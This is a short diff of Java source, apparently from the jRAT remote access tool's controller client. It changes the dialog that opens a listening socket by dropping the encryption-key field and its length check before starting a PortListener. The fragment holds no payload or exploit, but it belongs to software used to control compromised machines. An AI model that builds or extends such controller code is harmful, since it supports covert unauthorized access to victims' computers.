@@ -4,8 +4,6 @@ import io.jrat.client.ErrorDialog;
 import io.jrat.client.net.PortListener;
 import io.jrat.client.ui.components.EncryptionKeyJTextField;
 import io.jrat.client.utils.Utils;
-import io.jrat.common.crypto.Crypto;
-import io.jrat.common.crypto.EncryptionKey;
 
 import java.awt.Color;
 import java.awt.Toolkit;
@@ -110,17 +108,14 @@ public class FrameAddSocket extends BaseFrame {
 			int port = Integer.parseInt(sPort.getValue().toString());
 			int timeout = Integer.parseInt(sTimeout.getValue().toString()) * 1000;
 			String pass = txtPass.getText().trim();
-			EncryptionKey key = new EncryptionKey(txtKey.getText().trim());
 			String name = txtName.getText().trim();
 
 			if (pass.length() == 0) {
 				throw new Exception("Password length must be over 0");
-			} else if (key.getTextualKey().length() != Crypto.KEY_LENGTH) {
-				throw new Exception("Key length must be " + Crypto.KEY_LENGTH);
 			} else if (name.length() == 0) {
 				name = "Socket" + (new Random()).nextInt(10000);
 			}
-			PortListener connection = new PortListener(name, port, timeout, key, pass);
+			PortListener connection = new PortListener(name, port, timeout, pass);
 			connection.start();
 			setVisible(false);
 			dispose();
